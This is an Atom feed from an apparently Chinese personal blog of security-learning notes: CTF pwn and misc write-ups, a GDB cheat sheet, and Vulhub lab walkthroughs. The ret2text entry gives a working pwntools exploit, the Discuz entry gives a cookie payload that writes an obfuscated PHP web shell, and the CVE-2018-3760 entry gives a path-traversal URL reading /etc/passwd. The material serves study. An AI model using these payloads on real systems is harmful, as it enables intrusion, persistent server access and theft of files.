<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sinky&#39;s Blog</title>
  
  
  <link href="https://sinky.top/atom.xml" rel="self"/>
  
  <link href="https://sinky.top/"/>
  <updated>2022-12-07T08:47:47.380Z</updated>
  <id>https://sinky.top/</id>
  
  <author>
    <name>Sinky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>基本ROP之ret2shellcode</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2shellcode/</id>
    <published>2022-12-07T08:44:02.905Z</published>
    <updated>2022-12-07T08:47:47.380Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统的shell,一般来说shellcode需要自己填充。</p><p>控制程序执行shellcode。在栈溢出的基础上，若想在执行shellcode,需要对应的binary在运行时shellcode所在的区域具有可执行权限。</p><p>下载程序：</p><p><a href="https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ">https://pan.baidu.com/s/1VR8Ei39cozSaIjZa3laHkQ </a><br>提取码：r94f</p><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;ret2shellcode,即控制程序执行shellcode代码，shellcode指用于完成某个功能的汇编代码，常见功能主要是获取目标系统</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>GDB利用技巧</title>
    <link href="https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/"/>
    <id>https://sinky.top/2022/12/07/GDB%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/</id>
    <published>2022-12-07T07:33:09.644Z</published>
    <updated>2022-12-07T07:55:24.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h1><p>在源文件函数入口处断点：</p><pre><code class="hljs">b 文件名:函数名b text.c:func1</code></pre><p>在源文件某一行断点：</p><pre><code class="hljs">b 代码行号例：b 7</code></pre><p>在程序的某个地址断点：</p><pre><code class="hljs">b *address例：b 0x401000</code></pre><p>条件断点：</p><pre><code class="hljs">b num if cond例：b 14 if c=4</code></pre><p>查看断点：</p><pre><code class="hljs">info b</code></pre><p>删除断点：</p><pre><code class="hljs">del num[断点序号]</code></pre><p>设置断点有效和无效：</p><pre><code class="hljs">dis num # 将第num个断点设置为无效ena num # 将第num个断点设置为有效</code></pre><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><pre><code class="hljs">查看代码：l # 显示十行代码l 15 # 显示十五行代码l main # 显示main函数info source # 查看当前程序info r # 查看所有寄存器值info r 寄存器名 # c查看某一寄存器值</code></pre><h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>程序从main函数开始：</p><pre><code class="hljs">run</code></pre><p>运行到第一个断点处：</p><pre><code class="hljs">start</code></pre><h1 id="执行流控制"><a href="#执行流控制" class="headerlink" title="执行流控制"></a>执行流控制</h1><pre><code class="hljs">c/continue # 向下运行到下一个断点处n/next # 单步步过，执行下一行代码，不进入调用的函数，直接返回结果s/step # 单步步入finish # 跳出函数体until # 跳出当前循环，在执行完循环体内最后一句之后执行until，才可以跳出循环j/jump # 跳转到指定行/地址后继续执行，若无断点则继续执行stop # 停止运行quit # 退出gdb</code></pre><h1 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h1><pre><code class="hljs">p var # 打印变量值ptype var # 打印变量类型p &amp;var # 打印变量地址p *addr # 打印地址的值p /x var # 用十六禁止显示数据info args # 打印到当前函数参数值info locals # 打印当前函数中所有局部变量值</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;下断点&quot;&gt;&lt;a href=&quot;#下断点&quot; class=&quot;headerlink&quot; title=&quot;下断点&quot;&gt;&lt;/a&gt;下断点&lt;/h1&gt;&lt;p&gt;在源文件函数入口处断点：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;b 文件名:函数名
b text.c:func1
</summary>
      
    
    
    
    
    <category term="GDB" scheme="https://sinky.top/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2text</title>
    <link href="https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/"/>
    <id>https://sinky.top/2022/12/07/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2text/</id>
    <published>2022-12-07T05:39:07.931Z</published>
    <updated>2022-12-07T08:32:33.113Z</updated>
    
    <content type="html"><![CDATA[<p>访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。</p><p>自行下载：</p><p><a href="https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw">https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw</a></p><p>提取码：v4gi</p><p>跟着CTFWikiPWN一起做一遍：</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3" title="CTFWikiPWN">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3</a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>reet2text即控制程序本身已有的代码(.text)</p><p><img src="https://s2.loli.net/2022/12/07/GPTQWzslnur8YcU.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开了NX(栈不可以执行保护),可以考虑rop绕过。</p><p>main函数：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"There is something amazing here, do you know anything?"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Maybe I will tell you next time !"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>存在gets函数，栈溢出漏洞</p><p>找一下有没有后门函数：</p><p><img src="https://s2.loli.net/2022/12/07/EBqIiSLzMycNbZJ.png" alt="image.png"></p><p><code>/bin/sh</code>地址：0x0804863A</p><p>控制程序返回0x0804863A就可以拿到shell.</p><h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>先看一下变量s：</p><p><img src="https://s2.loli.net/2022/12/07/GDcKFTvPhAo2j7W.png" alt="image.png"></p><p>先确定能够控制的内存起始地址距离main函数返回地址的字节数。</p><p>如上图，该字符串通过esp进行索引。</p><p>进入gdb：</p><pre><code class="hljs">b *0x080486AEr</code></pre><p>在call处下断点，运行,查看esp和ebp</p><p><img src="https://s2.loli.net/2022/12/07/9YyXFofLGH1iQsk.png" alt="image.png"></p><p>esp: 0xffffd480</p><p>ebp: 0xffffd508</p><p>根据代码</p><p><img src="https://s2.loli.net/2022/12/07/AZtbInzKYoFxVBP.png" alt="image.png"></p><p>(R一下就会变成1C了)</p><p>可知，s相对于esp的索引为<code>esp+1C</code></p><p>则s地址为：</p><pre><code class="hljs">0xffffd480 + 0x1C = 0xffffd49c</code></pre><p>s相对于ebp的偏移为：</p><pre><code class="hljs">0xffffd508 - 0xffffd49c = 0x6C</code></pre><p>s相对于返回地址的偏移为：</p><pre><code class="hljs">0x6C+4</code></pre><p>所以：</p><pre><code class="hljs">payload='a'*0x6C+'b'*4+p32(0x0804863A)</code></pre><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p=process('./ret2text')sys=0x0804863apayload='a'*0x6C+'b'*4+p32(sys)p.sendlines(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/07/6hJBfwvXo9ky23P.png" alt="image.png"></p><p>呜呜呜感觉终于对pwn稍微稍微的有了那么一点点头绪哭了哭了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;访问不了github，改了host,也试过改DNS都不行，抓狂浪费时间，最后果断选择翻一下下载了这个程序。&lt;/p&gt;
&lt;p&gt;自行下载：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1Wq6z-hpkBkZESn14Q9jHtw&quot;&gt;https</summary>
      
    
    
    
    
    <category term="ROP" scheme="https://sinky.top/tags/ROP/"/>
    
    <category term="栈溢出" scheme="https://sinky.top/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CTFWikiPWN" scheme="https://sinky.top/tags/CTFWikiPWN/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界 PWN-200</title>
    <link href="https://sinky.top/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/"/>
    <id>https://sinky.top/2022/12/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-PWN-200(%E5%BE%85%E8%A1%A5%E5%85%85)/</id>
    <published>2022-12-05T05:35:39.929Z</published>
    <updated>2022-12-06T07:36:35.793Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>拿到题目先查一下保护：</p><p><img src="https://s2.loli.net/2022/12/05/YHz4qNbSylvX3dI.png" alt="image.png"></p><p>32位，没开栈保护和PIE；开了NX,可不执行内存可以用rop；</p><p>Partial RELRO - got表可写</p><p>扔进IDA看一下：</p><p>主函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">int __cdecl <span class="hljs-selector-tag">main</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+2Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">strcpy</span>(buf, "Welcome to XDCTF2015~!\n");<br>  <span class="hljs-built_in">memset</span>(&amp;buf[<span class="hljs-number">24</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>x4Cu);<br>  <span class="hljs-built_in">setbuf</span>(stdout, buf);<br>  <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, buf, strlen(buf));<br>  <span class="hljs-built_in">sub_8048484</span>();<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>sub_8048484()函数：</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssize_t <span class="hljs-built_in">sub_8048484</span>()<br>{<br>  char buf<span class="hljs-selector-attr">[108]</span>; <span class="hljs-comment">// [esp+1Ch] [ebp-6Ch] BYREF</span><br>  <span class="hljs-built_in">setbuf</span>(stdin, buf);<br>  return <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>x100u);<br>}<br></code></pre></td></tr></tbody></table></figure><p>此处存在栈溢出，buf最多只有6Ch,但read读入了0x100的大小。</p><h1 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h1><ol><li>有read(),write(),无system()</li><li>在函数sub_8048484()中存在栈溢出</li></ol><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>通过栈溢出调用write()函数泄露write()对应的got表内容，此处将write()函数的返回地址设置为main或sub_8048484()的地址以便再次利用栈溢出漏洞</li><li>通过LibcSearcher获取libc版本</li><li>获取system函数，<code>'/bin/sh'</code>地址</li><li>再次利用栈溢出漏洞执行system函数</li></ol><h2 id="LibcSearcher安装"><a href="#LibcSearcher安装" class="headerlink" title="LibcSearcher安装"></a>LibcSearcher安装</h2><pre><code class="hljs">git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearcherpython setup.py develop</code></pre><p>一般使用方法：</p><pre><code class="hljs">libc = LibcSearcher("gets",gets_real_addr)libcbase = gets_real_addr – obj.dump("fgets")system_addr = libcbase + obj.dump("system")            #system 偏移bin_sh_addr = libcbase + obj.dump("str_bin_sh")         #/bin/sh 偏移</code></pre><p>参考：<br><a href="https://blog.csdn.net/qq_44108455/article/details/105458234">https://blog.csdn.net/qq_44108455/article/details/105458234</a></p><p><a href="https://blog.csdn.net/shanwei274/article/details/115529108">https://blog.csdn.net/shanwei274/article/details/115529108</a></p><ul><li>DynELF：pwntools中用于针对没有给libc情况的漏洞利用模块，一般用puts和write函数来泄露libc地址。</li><li>DynELF使用要求：<ul><li>漏洞可以泄露libc地址</li><li>漏洞可以反复利用</li></ul></li></ul><p>有关DynELF使用的文章：<br><a href="https://www.anquanke.com/post/id/85129">https://www.anquanke.com/post/id/85129</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;p&gt;拿到题目先查一下保护：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/12/05/YHz4qNbSyl</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Windows下搭建蚂蚁笔记(待补充)</title>
    <link href="https://sinky.top/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/"/>
    <id>https://sinky.top/2022/12/05/Windows%E4%B8%8B%E6%90%AD%E5%BB%BA%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/</id>
    <published>2022-12-05T01:24:26.672Z</published>
    <updated>2022-12-05T01:41:59.971Z</updated>
    
    <content type="html"><![CDATA[<p>环境：Windows 10</p><h1 id="安装MongoDB及附带工具包"><a href="#安装MongoDB及附带工具包" class="headerlink" title="安装MongoDB及附带工具包"></a>安装MongoDB及附带工具包</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境：Windows 10&lt;/p&gt;
&lt;h1 id=&quot;安装MongoDB及附带工具包&quot;&gt;&lt;a href=&quot;#安装MongoDB及附带工具包&quot; class=&quot;headerlink&quot; title=&quot;安装MongoDB及附带工具包&quot;&gt;&lt;/a&gt;安装MongoDB及附带工具包&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="搭建环境" scheme="https://sinky.top/tags/%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
    
    <category term="蚂蚁笔记" scheme="https://sinky.top/tags/%E8%9A%82%E8%9A%81%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-Misc</title>
    <link href="https://sinky.top/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/"/>
    <id>https://sinky.top/2022/11/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc/</id>
    <published>2022-11-30T06:46:31.756Z</published>
    <updated>2022-12-01T06:03:43.156Z</updated>
    
    <content type="html"><![CDATA[<p>不想学习……所以来做几个杂项</p><h1 id="真是阳间题"><a href="#真是阳间题" class="headerlink" title="真是阳间题"></a>真是阳间题</h1><p>下载打开是一串数字，也不是十六进制，搜了一下不知道啥加密，看wp之后发现要十转十六再转文本，得到：</p><pre><code class="hljs">====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI</code></pre><p>等号明显是Base，倒过来得到：</p><pre><code class="hljs">IZIUCUSEPNGDA5K7K4YHGX3ZOAZV6NC7NM2HC4TDOBPTAZC7MFYHO3TSGB6Q====</code></pre><p>脚本：</p><pre><code class="hljs">str="====Q6BGST3OHYFM7CZATPBODT4CH2MN7CN6VZAOZ3XGHY4K7K5ADGNPESUCUIZI"result=str[::-1]print(result)</code></pre><p>base32解码得<code>FQARD{L0u_W0s_yp3_4_k4qrcp_0d_apwnr0}</code></p><p>还是不对，应该是移位，尝试凯撒密码，移位2，加密得：</p><pre><code class="hljs">HSCTF{N0w_Y0u_ar3_4_m4ster_0f_crypt0}</code></pre><h1 id="我们的秘密是绿色的"><a href="#我们的秘密是绿色的" class="headerlink" title="我们的秘密是绿色的"></a>我们的秘密是绿色的</h1><p>开局一张绿图，没找到隐写，看wp。</p><p>使用工具oursercert,密码是日历上的绿体字日期数字：0405111218192526</p><p>压缩包有密码，双击看到提示：</p><p><img src="https://s2.loli.net/2022/11/30/3HESYB9badDMGgl.png" alt="image.png"></p><p>搜了一下coffee的生日，啥玩意儿不对，开始爆破拿到密码：19950822</p><p><img src="https://s2.loli.net/2022/11/30/irIZQVxCjvu7GFL.png" alt="image.png"></p><p>打开看了以下txt：</p><p><img src="https://s2.loli.net/2022/11/30/NuWTbAvJMqXd5wB.png" alt="image.png"></p><p>6</p><p>打开flag，又是加密，意料之中。</p><p><img src="https://s2.loli.net/2022/11/30/O5fPrnXxiWUgZqm.png" alt="image.png"></p><p>又爆破？</p><p>试了，不行，遇事不决看wp。</p><p>明文攻击：把readme.txt压缩成zip文件，然后用ARCHPR明文攻击：</p><p><img src="https://s2.loli.net/2022/11/30/waJG7Eqj5Wdo2KV.png" alt="image.png"></p><pre><code class="hljs">Y29mZmVl</code></pre><p>打开，竟然还有一层压缩解密……这边只能单走一个6</p><p>伪加密，没碰到过，去学一下：</p><p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768" title="CTF——zip伪加密">https://blog.csdn.net/xiaozhaidada/article/details/124538768</a></p><p>我winhex过期了，懒得弄，看一下网上的分析：</p><p>把504B0304后的第3、4个byte改成0000还有把504B0102后的第5、6个byte改成0000即可破解伪加密</p><p>或者用7z也能看（我不下，那玩意太流氓了）</p><p>得到密文：<code>qddpqwnpcplen%prqwn_{_zz*d@gq}</code></p><p>栅栏密：</p><pre><code class="hljs">qwlr{ddneq_@dpnwzgpc%nzqqpp_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/ZxpkOcD2PjitIzH.png" alt="image.png"></p><p>凯撒：</p><pre><code class="hljs">flag{ssctf_@seclover%coffee_*}</code></pre><p><img src="https://s2.loli.net/2022/11/30/WAOCXHulKFnpz1R.png" alt="image.png"></p><p>这他妈谁能想到，请暴打出题人！！！！</p><h1 id="Miscellaneous-200"><a href="#Miscellaneous-200" class="headerlink" title="Miscellaneous-200"></a>Miscellaneous-200</h1><p><img src="https://s2.loli.net/2022/12/01/GzgH6NE41opeYxk.png" alt="image.png"></p><p>题目打开就是这，百度了一下有没有类似的加密方式，没找到</p><p>说实话，看到这个255，255，255.本人下意识就想到了那个RGB颜色数值，但是还是不得其解，遂看wp。</p><p>还原图片：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from ast import literal_eval<br>from PIL import Image<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">'C:\\flag.txt'</span>, <span class="hljs-string">'r'</span>)<br>corl = <span class="hljs-selector-attr">[literal_eval(line) for line in f.readlines()]</span><br>f<span class="hljs-selector-class">.close</span>()<br><span class="hljs-selector-tag">img</span> = Image<span class="hljs-selector-class">.new</span>(<span class="hljs-string">'RGB'</span>, (<span class="hljs-number">270</span>, <span class="hljs-number">270</span>), <span class="hljs-string">'#ffffff'</span>)<br>k=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>   <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">246</span>):<br>      <span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.putpixel</span> (<span class="hljs-selector-attr">[i , j]</span>, corl<span class="hljs-selector-attr">[k]</span>)<br>      k=k+<span class="hljs-number">1</span><br><span class="hljs-selector-tag">img</span><span class="hljs-selector-class">.save</span>(<span class="hljs-string">"flag.png"</span>)<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/12/01/H9yl7vRUsnrSXiB.png" alt="image.png"></p><p>这是什么扭曲的文字，嗯？</p><pre><code class="hljs">flag{ youc@n'tseeme }</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不想学习……所以来做几个杂项&lt;/p&gt;
&lt;h1 id=&quot;真是阳间题&quot;&gt;&lt;a href=&quot;#真是阳间题&quot; class=&quot;headerlink&quot; title=&quot;真是阳间题&quot;&gt;&lt;/a&gt;真是阳间题&lt;/h1&gt;&lt;p&gt;下载打开是一串数字，也不是十六进制，搜了一下不知道啥加密，看wp之后发现</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Misc" scheme="https://sinky.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub之wooyun-2010-080723</title>
    <link href="https://sinky.top/2022/11/28/Vulhub%EF%BC%9Awooyun-2010-080723/"/>
    <id>https://sinky.top/2022/11/28/Vulhub%EF%BC%9Awooyun-2010-080723/</id>
    <published>2022-11-28T05:49:01.650Z</published>
    <updated>2022-11-30T09:11:35.567Z</updated>
    
    <content type="html"><![CDATA[<p>完全看不懂，所以先跟着其他文章走一遍，以后再回顾。</p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>由于php5.3x版本里php.ini的设置里request_order默认值为GP,导致REQUEST中不再包含_COOKIE，我们通过在cookie中传入<code>$GLOBALS</code>来覆盖全局变量，造成代码执行漏洞。</p><p>影响版本：<code>Discu 7.x  6.x</code></p><p>数据库地址：db</p><p>数据库名：discuz</p><p>数据库用户名及密码：root</p><p>管理员账号：admin</p><p>管理员密码：root</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>安装完成后，找一个帖子抓包，将cookie改成：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</code></pre><p>成功执行<code>phpinfo();</code></p><p><img src="https://s2.loli.net/2022/11/28/UOwgudGJy9qZDjN.png" alt="image.png"></p><p>写入webshell，将cookie改为：</p><pre><code class="hljs">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))&lt;?php @eval($_POST[pwd])?&gt;</code></pre><p><img src="https://s2.loli.net/2022/11/28/inc7KuRSVGBFC1N.png" alt="image.png"></p><p>蚁剑连接：</p><p>ip：/x.php</p><p>密码：pwd</p><p><img src="https://s2.loli.net/2022/11/28/ujskDg95xNdHbC6.png" alt="image.png"></p><p>getshell</p><h1 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h1><ol><li>如php中的<code>system、exec、shell_exec、passthru、proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将而已系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</li><li><code>$GLOBALS</code> 引用全局作用域中可用的全部变量；关联数组array，包含当前脚本内定义成全局范围的所有变量的引用。数组的键就是变量的名字。</li><li>chr()码值表：返回值是当前整数对应的ASCII字符</li></ol><p>参考文章：</p><p><a href="https://www.cnblogs.com/cute-puli/p/13333991.html">https://www.cnblogs.com/cute-puli/p/13333991.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;完全看不懂，所以先跟着其他文章走一遍，以后再回顾。&lt;/p&gt;
&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;由于php5.3x版本里php.ini的设置里reques</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Vulhub之 CVE-2018-3760</title>
    <link href="https://sinky.top/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/"/>
    <id>https://sinky.top/2022/11/25/vulhub%EF%BC%9ACVE-2018-3760/</id>
    <published>2022-11-25T01:49:30.605Z</published>
    <updated>2022-11-25T05:58:40.995Z</updated>
    
    <content type="html"><![CDATA[<p>先搜一下3760的形成原理：</p><p>Ruby on Rails 路径穿越；</p><p>高危；</p><p>影响版本： 版本&lt;=Sprockets 3.7.1</p><p>Ruby on rails在开发环境下使用Sprockets作为静态文件服务器，在Sprockets 3.7.1及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用<code>%25e%25e/</code>来跨越到就根目录，读取或执行目标服务器上任意文件。</p><p>Sprockets是一个用于编译和提供Web Assets 的Ruby库。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>目的：利用已知漏洞读取文件passwd。</p><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:///etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/buyhqXf96nOvz7L.png" alt="image.png"></p><p>直接在url后门进行文件包含，<code>/</code>被过滤，换成url编码重新访问试试：</p><pre><code class="hljs">/ 的URL编码为%2fhttp://192.168.218.145:3000/assets/file:%2f%2f/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/Bx4FSePLzYXZ8yR.png" alt="image.png"></p><p>因为<code>/etc/passwd</code>在不允许的目录中，但在报错页面给出了允许的目录列表。</p><p>随意选一个，用<code>.../.../</code>的办法向上跳转读取<code>/etc/passwd</code></p><pre><code class="hljs">" . "  url编码为%2e,二次编码为%252e</code></pre><p>payload:</p><pre><code class="hljs">http://192.168.218.145:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/11/25/xH7t5konC8ifu9h.png" alt="image.png"></p><p>参考文章</p><p><a href="https://blog.csdn.net/qq_51524329/article/details/121845115">https://blog.csdn.net/qq_51524329/article/details/121845115</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先搜一下3760的形成原理：&lt;/p&gt;
&lt;p&gt;Ruby on Rails 路径穿越；&lt;/p&gt;
&lt;p&gt;高危；&lt;/p&gt;
&lt;p&gt;影响版本： 版本&amp;lt;=Sprockets 3.7.1&lt;/p&gt;
